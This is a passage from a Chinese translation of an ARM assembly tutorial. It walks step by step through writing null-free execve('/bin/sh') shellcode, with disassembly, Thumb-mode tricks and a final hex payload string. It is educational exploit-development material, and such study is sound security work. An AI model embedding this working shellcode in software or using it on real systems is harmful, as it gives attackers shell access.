    +++ exited with 0 +++
结果证明，系统函数execve()正在被调用
# 2.系统调用编号和参数
下一步是找出execve()的系统调用编号和所需的参数。
您可以通过[w3calls](https://w3challs.com/syscalls/?arch=arm_strong)或[Linux手册页](http://www.manpages.info/linux/execve.2.html)查找系统调用的概述。
这是我们从execve()的手册页中得到的：
    NAME
        execve - execute program
    SYNOPSIS
        #include 
        int execve(const char *filename, char *const argv [], char *const envp[]);
execve()要求的参数是：
  * 指向指定二进制路径的字符串的指针
  * argv [] - 命令行变量数组
  * envp [] - 环境变量数组
这些基本上可以转换为：execve( _filename，_ argv []， _envp []) - > execve(_filename，0, 0)。
使用以下命令查找此函数的系统调用编号：
    azeria@labs:~$ grep execve /usr/include/arm-linux-gnueabihf/asm/unistd.h 
    #define __NR_execve (__NR_SYSCALL_BASE+ 11)
查看输出，可以看到execve()的系统调用编号是11。寄存器R0到R2可用于函数参数，而寄存器R7可以存储系统调用编号。  
在x86上调用系统调用的工作方式如下：首先，将参数入栈。 然后，系统调用编号被移入EAX寄存器( MOV EAX，syscall_number)。
最后，使用SYSENTER/INT 80调用系统调用。
在ARM上，系统调用的工作方式略有不同：
1.将参数移动到寄存器 - R0，R1，..
2.将系统调用编号移动到寄存器R7中
  * mov r7，＃
3.产生一个系统调用
  * SVC＃0或
  * SVC＃1
4.返回值存入R0
这是它在ARM Assembly中的样子（[代码已上传到azeria-labs的Github上](https://github.com/azeria-labs/ARM-assembly-examples/blob/master/execve1.s)）：
正如您在上图中所看到的，我们首先使用PC相对寻址将R0指向我们的“/bin/sh”字符串（如果您不记得为什么有效的PC在当前指令之前启动两条指令，请转到汇编基础知识教程的“[第2部分:数据类型和寄存器](https://azeria-labs.com/arm-data-types-and-registers-part-2/)”，并查看解释PC寄存器以及示例的部分）。
然后我们将0移动到R1和R2并将系统调用编号11移动到R7。 看起来很简单吧？ 让我们看一下使用objdump的第一次尝试的反汇编：
    azeria@labs:~$ as execve1.s -o execve1.o
    azeria@labs:~$ objdump -d execve1.o
    execve1.o: file format elf32-littlearm
    Disassembly of section .text:
    00000000 :
     0: e28f000c add r0, pc, #12
     4: e3a01000 mov r1, #0
     8: e3a02000 mov r2, #0
     c: e3a0700b mov r7, #11
     10: ef000000 svc 0x00000000
     14: 6e69622f .word 0x6e69622f
     18: 0068732f .word 0x0068732f
事实证明我们的shellcode中有很多空字节。 下一步是使shellcode有效化，并替换所有涉及的操作。
# 3.使shellcode有效化
Thumb模式是减小空字节出现在我们的shellcode中的几率的可用技术之一。这是因为Thumb指令长度为2个字节而不是4个。如果您完成了ARM
Assembly Basics教程，就会知道如何从ARM切换到Thumb模式。 如果还没有，我建议您阅读“[条件执行和分支](https://azeria-labs.com/arm-conditional-execution-and-branching-part-6/)”教程的第6部分中有关分支指令“B /
BX / BLX”的章节。
在我们的第二次尝试中，我们使用Thumb模式并将包含#0的操作替换为导致0的操作，具体方法是相互减去寄存器或进行异或操作。 例如，不使用“mov
r1，#0”，而是使用“sub r1, r1, r1”（r1 = r1-r1）或“eor r1，r1，r1”（r1 = r1 xor r1）。
请记住，由于我们现在使用Thumb模式（2字节指令），我们的代码必须是4字节对齐，并且我们需要在末尾添加NOP（例如mov r5，r5）。
（[代码已上传到azeria-labs的Github上](https://github.com/azeria-labs/ARM-assembly-examples/blob/master/execve2.s)）：  
反汇编的代码如下所示：  
结果是我们只需要摆脱一个空字节。 我们的代码中导致空字节的部分是以空字符结尾的字符串“/bin/sh\ 0”。 我们可以使用以下技术解决此问题：
  * 将“/bin/sh\0”替换为“/bin/shX”
  * 将指令strb（存储字节）与现有的零填充寄存器结合使用，将X替换为空字节
（[代码已上传到azeria-labs的Github上](https://github.com/azeria-labs/ARM-assembly-examples/blob/master/execve3.s)）：  
瞧 - 没有空字节！
# 4.将SHELLCODE转换为HEX STRING
现在我们创建的shellcode可以转换为它的十六进制表示。 在此之前，最好检查shellcode是否能独立工作。
但是有一个问题：如果我们像通常那样编译汇编文件，它将无法工作。 因为我们用了strb操作来修改代码段（.text）。
这要求代码段是可写的，可以通过在链接过程中添加-N标志来实现。
    azeria@labs:~$ ld --help
    --- snip --    -N, --omagic Do not page align data, do not make text readonly.
    --- snip -- 
    azeria@labs:~$ as execve3.s -o execve3.o && ld -N execve3.o -o execve3
    azeria@labs:~$ ./execve3
    $ whoami
    azeria
有用！ 恭喜，您已经在ARM程序集中编写了第一个shellcode。
要将其转换为十六进制，请使用以下指令：
    azeria@labs:~$ objcopy -O binary execve3 execve3.bin 
    azeria@labs:~$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' execve3.bin 
    \x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78
也可以使用简单的python脚本执行相同操作，而不是使用上面的hexdump指令：
    #!/usr/bin/env python
    import sys
    binary = open(sys.argv[1],'rb')
    for byte in binary.read():
     sys.stdout.write("\\x"+byte.encode("hex"))
    print ""
    azeria@labs:~$ ./shellcode.py execve3.bin
    \x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78
希望您喜欢这篇文章。 在下一部分中，您将学习如何以反向shell的形式编写shellcode，这比上面的示例稍微复杂一些。
之后，我们将深入研究内存损坏并了解它们是如何发生的，以及如何使用我们自制的shellcode来利用它们。
（译者注：如果想了解用x86汇编写shellcode，可以看这篇[Linux下shellcode的编写](https://xz.aliyun.com/t/2052)）